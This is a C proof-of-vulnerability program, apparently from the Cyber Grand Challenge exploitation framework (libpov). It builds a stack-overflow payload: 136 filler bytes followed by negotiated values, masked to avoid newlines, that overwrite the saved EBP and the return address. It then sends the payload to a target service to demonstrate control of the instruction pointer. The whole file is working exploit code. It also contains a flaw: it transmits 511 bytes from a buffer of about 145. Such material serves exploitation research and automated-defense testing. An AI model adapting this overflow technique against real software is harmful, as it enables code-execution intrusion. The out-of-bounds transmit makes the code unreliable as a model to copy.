#include <libpov.h>

//This receive does buffering so we don't receive 1 all the time
#define RECV_BUF_SIZE 128
static char gRecvBuffer[RECV_BUF_SIZE];
static size_t gCurOff = 0;
static size_t gNumAvail = 0;

void receive_all(int fd, void* buf, size_t len)
{
  size_t rx_bytes = 0;
  size_t total = 0;
  int ret = 0;

  do
  {
    if (gNumAvail > 0)
    {
      for (rx_bytes = 0; gNumAvail > 0; rx_bytes++)
      {
        *((char*)(buf + total)) = gRecvBuffer[gCurOff];
        gCurOff++;
        gNumAvail--;
        total++;
        if (total == len)
        {
          return;
        }
      }
      gCurOff = 0; 
      gNumAvail = 0;
      continue; //go to the next iteration
    }
    ret = receive(fd, buf+total, len-total, &rx_bytes);
    if ( (ret != 0) || (rx_bytes == 0) )
    {
      _terminate(-1);
    }
    total += rx_bytes;
  } while (total < len);

  if (buf == NULL)
  {
    _terminate(-1);
  }
}

size_t receive_until(int fd, char* buf, size_t len, char delim)
{

  int ret = 0;
  size_t rx_bytes = 0;

  char c = 0;
  size_t count = 0;
  if (buf == NULL)
  {
    return (0);
  }

  do
  {
    if (gNumAvail <= 0)
    {
      ret = receive(fd, gRecvBuffer, RECV_BUF_SIZE, &rx_bytes);
      if ( (ret != 0) || (rx_bytes == 0) )
      {
        _terminate(-1);
      }
      gCurOff = 0;
      gNumAvail = rx_bytes;
      continue; //next iteration
    }
    c = gRecvBuffer[gCurOff];
    buf[count] = c;
    gCurOff++;
    gNumAvail--;
    count++;
  } while ( (count < (len - 1)) && (c != delim) );
  
  buf[count] = '\0'; //append NULL character

  return  (count);
}


int main(void)
{
  char buf[512];

  char msg1[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\n";

  unsigned int ipmask = 0x0EEEEEEE;
  unsigned int orMask = 0xF1111111; //We use this mask because the read is delimited
                                    // so we will or the requested value with this
                                    // to ensure 0x0a doesn't exist
  unsigned int regmask = 0x0EEEEEEE;
  unsigned int regnum = 5;//ebp

  type1_vals t1v;
  type1_negotiate(ipmask, regmask, regnum, &t1v);


  *((unsigned int*)(msg1 + 136)) = t1v.regval | orMask;
  *((unsigned int*)(msg1 + 140)) = t1v.ipval | orMask;

  receive_until(STDIN, (char*)buf, 512, '\n');

  transmit_all(STDOUT, msg1, sizeof(buf) - 1);

  return (0);
}

